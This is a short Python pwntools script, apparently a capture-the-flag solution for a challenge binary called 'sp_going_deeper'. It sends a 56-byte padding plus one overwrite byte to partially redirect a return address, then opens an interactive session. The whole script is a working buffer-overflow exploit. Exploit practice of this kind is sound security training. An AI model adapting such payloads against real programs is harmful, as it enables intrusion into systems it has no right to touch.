# one buffer over flow 0x40ab41 -> 0x40ab42

from pwn import *

if len(sys.argv) < 2:
    r = process("./sp_going_deeper")
else:
    r = remote(*(sys.argv[1].split(':')))

r.sendlineafter(b">>", b'1')

payload = b'A' * 56 + b'\x12'

r.sendlineafter(b":", payload)

r.interactive()